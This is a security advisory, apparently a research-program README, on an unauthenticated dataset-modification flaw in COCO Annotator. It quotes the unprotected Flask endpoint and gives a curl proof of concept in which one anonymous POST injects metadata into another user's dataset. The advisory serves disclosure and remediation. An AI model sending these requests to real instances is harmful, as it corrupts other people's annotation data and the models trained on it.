<div align="center">
  <a href="https://www.thoropass.com/" target="_blank" rel="noopener noreferrer">
    <img src="https://github.com/user-attachments/assets/b3bbec80-2537-4578-889e-18eaad0d1194" width="150" alt="Thoropass Logo">
  </a>
  <br><br>
  <a href="https://www.thoropass.com/talk-to-an-expert" target="_blank" rel="noopener noreferrer">
    <img src="https://img.shields.io/badge/🌐_WEBSITE-THOROPASS-0078D4?style=for-the-badge" alt="Website">
  </a>
  <a href="https://www.linkedin.com/company/thoropass/" target="_blank" rel="noopener noreferrer">
    <img src="https://img.shields.io/badge/LINKEDIN-CONNECT-0077B5?style=for-the-badge&logo=linkedin&logoColor=white" alt="LinkedIn">
  </a>

  <h1>Unauthenticated Dataset Modification in COCO Annotator</h1>

  <p>🔐 <strong>Thoropass Vulnerability Research Program</strong> 🧪</p>
</div>

<div align="center">
<img src="https://img.shields.io/badge/CVE-2026--XXXX-7ED957?style=for-the-badge" alt="Status: Disclosed">
  <img src="https://img.shields.io/badge/SEVERITY-XXX_0.0-FF4444?style=for-the-badge" alt="Severity: High">
  <img src="https://img.shields.io/badge/TYPE-BFLA-9B59B6?style=for-the-badge" alt="Type: BFLA">
</div>

---

## Advisory Information

| &nbsp; | &nbsp; |
|:---|:---|
| **Researcher** | [Natan Morette](https://www.linkedin.com/in/nmmorette/) on behalf of [Thoropass](https://thoropass.com) |
| **Product** | [COCO Annotator](https://github.com/jsbroks/coco-annotator) - Open-source, web-based image annotation platform used to build datasets for computer vision and machine learning workflows, supporting the COCO dataset format. |
| **Affected Version** | All versions up to and including latest (`master` branch, commit `c3405b6`) |
| **Endpoint** | `backend/webserver/api/datasets.py` — `DatasetId` resource, `POST` method |
| **Vulnerability Type** | CWE-306: Missing Authentication for Critical Function |
| **CVE ID** | *Pending assignment* |


## Vulnerability Summary

A **missing authentication vulnerability** exists in the COCO Annotator dataset management API. The `POST /api/dataset/<id>` endpoint, which updates a dataset's categories and default annotation metadata, is **missing the `@login_required` decorator**. This allows any **unauthenticated, anonymous attacker** to modify any dataset in the system with a single HTTP request — no credentials, no session cookie, and no token required.

The `DELETE` method on the **same route** is correctly protected with `@login_required`, making this an oversight where only the `POST` method was left unprotected.


## Technical Analysis

### Vulnerable Code

**File:** `backend/webserver/api/datasets.py`, lines **234–287**

```python
@api.route('/<int:dataset_id>')
class DatasetId(Resource):

    @login_required                      # ← DELETE is protected
    def delete(self, dataset_id):
        """ Deletes dataset by ID (only owners)"""
        ...

    @api.expect(update_dataset)          # ← POST is NOT protected
    def post(self, dataset_id):          # ← NO @login_required!
        """ Updates dataset by ID """
        dataset = current_user.datasets.filter(id=dataset_id, deleted=False).first()
        ...
        dataset.update(
            categories=dataset.categories,
            default_annotation_metadata=dataset.default_annotation_metadata
        )
        return {"success": True}
```

### Root Cause

The `POST` method on the `DatasetId` resource (line 252) is missing the `@login_required` decorator. When an unauthenticated request reaches this endpoint, Flask-Login falls back to the `AnonymousUser` class, which grants unrestricted access to **all** datasets and returns `True` for all permission checks:

**File:** `backend/webserver/authentication.py`

```python
class AnonymousUser(AnonymousUserMixin):
    @property
    def datasets(self):
        return DatasetModel.objects    # ← returns ALL datasets

    def can_edit(self, model):
        return True                    # ← always True
```

This means that when an unauthenticated request hits `POST /api/dataset/<id>`, `current_user` resolves to `AnonymousUser`, whose `.datasets` returns **all** datasets in the database — so `.filter(id=dataset_id)` matches any dataset regardless of ownership, and the update succeeds.


## Proof of Concept

### Step 1 — Login as the dataset owner and check current metadata

```bash
curl -s -X POST http://TARGET:5001/api/user/login -H "Content-Type: application/json" -d '{"username":"victim","password":"password"}' -c cookies.txt
```

```bash
curl -s http://TARGET:5001/api/dataset/ -b cookies.txt | python3 -c "import sys,json; [print(json.dumps(ds,indent=2)) for ds in json.load(sys.stdin) if ds['id']==3]"
```

```json
{
  "id": 3,
  "name": "my-dataset",
  "owner": "victim",
  "default_annotation_metadata": {}
}
```

### Step 2 — Modify the dataset WITHOUT any authentication

No cookies, no token, no session — completely unauthenticated:

```bash
curl -s -X POST http://TARGET:5001/api/dataset/3 -H "Content-Type: application/json" -d '{"default_annotation_metadata":{"hacked_by":"unauthenticated_attacker","compromised":true}}'
```

```json
{"success": true}
```

### Step 3 — Verify the dataset was tampered with

```bash
curl -s http://TARGET:5001/api/dataset/ -b cookies.txt | python3 -c "import sys,json; [print(json.dumps(ds,indent=2)) for ds in json.load(sys.stdin) if ds['id']==3]"
```

```json
{
  "id": 3,
  "name": "my-dataset",
  "owner": "victim",
  "default_annotation_metadata": {
    "hacked_by": "unauthenticated_attacker",
    "compromised": true
  }
}
```

The metadata was injected by an unauthenticated request into a dataset owned by another user.


## **Impact**

- **Unauthenticated data modification** — any anonymous attacker on the network can modify the categories and default annotation metadata of ANY dataset in the system, without any credentials
- **Annotation metadata injection** — the `default_annotation_metadata` field is propagated to all annotations in the dataset via `AnnotationModel.objects(...).update(**update)` (line 279), meaning injected metadata contaminates the entire annotation pipeline
- **Data integrity corruption** — in production ML/CV workflows, corrupted annotation metadata can silently degrade model training quality, with downstream effects that may go undetected for extended periods
- **No privilege required** — this is a fully unauthenticated attack (PR:N). No account registration, no session, no cookies, no tokens — a single HTTP POST is sufficient
- **Trivial exploitation** — the attack consists of a single HTTP request, making it scriptable and automatable against any exposed COCO Annotator instance


## References

- [CWE-306: Missing Authentication for Critical Function](https://cwe.mitre.org/data/definitions/306.html)
- [OWASP API5:2023 — Broken Function Level Authorization](https://owasp.org/API-Security/editions/2023/en/0xa5-broken-function-level-authorization/)
- [OWASP Testing Guide: Testing for Broken Access Control (WSTG-ATHZ)](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/)


## ⚠️ Disclaimer

The vulnerability was identified through authorized security testing. The proof of concept is provided to help defenders validate their exposure and verify remediation.

Thoropass follows **coordinated vulnerability disclosure (CVD)** principles. Vulnerabilities are reported privately to maintainers, reasonable time is provided for remediation, and public advisories are released after coordination or fix availability.


## About Thoropass
Thoropass delivers enterprise-grade audits with AI-native speed and precision. Designed from day one to integrate auditors, automation, and infosec workflows in a single, closed-loop system, no add-ons, no handoffs.

Our experienced penetration testing team proactively discovers vulnerabilities in web applications, APIs, and infrastructure — helping organizations secure their systems before attackers find weaknesses.

<div align="center">
  <br>

  **Thoropass Vulnerability Research Program**

  <em>Improving ecosystem security through responsible research and disclosure.</em>

  <br><br>
  <a href="https://thoropass.com/contact" target="_blank" rel="noopener noreferrer">
    <img src="https://img.shields.io/badge/🔒_Request_a_Penetration_Test-Get_Started-7ED957?style=for-the-badge" alt="Request Pentest">
  </a>
  <br><br>
  <a href="https://www.thoropass.com/platform/penetration-testing" target="_blank" rel="noopener noreferrer">
    <img src="https://img.shields.io/badge/🌐_WEBSITE-THOROPASS-0078D4?style=for-the-badge" alt="Website">
  </a>
  <a href="https://www.linkedin.com/company/thoropass/" target="_blank" rel="noopener noreferrer">
    <img src="https://img.shields.io/badge/LINKEDIN-CONNECT-0077B5?style=for-the-badge&logo=linkedin&logoColor=white" alt="LinkedIn">
  </a>
</div>

---

<div align="center">
  <br><br>
  <a href="https://www.thoropass.com/talk-to-an-expert" target="_blank" rel="noopener noreferrer">
    <img width="100%" alt="Thoropass" src="https://github.com/user-attachments/assets/557c3c6e-bc2d-4b0e-90cb-503767a0aa23">
  </a>
</div>
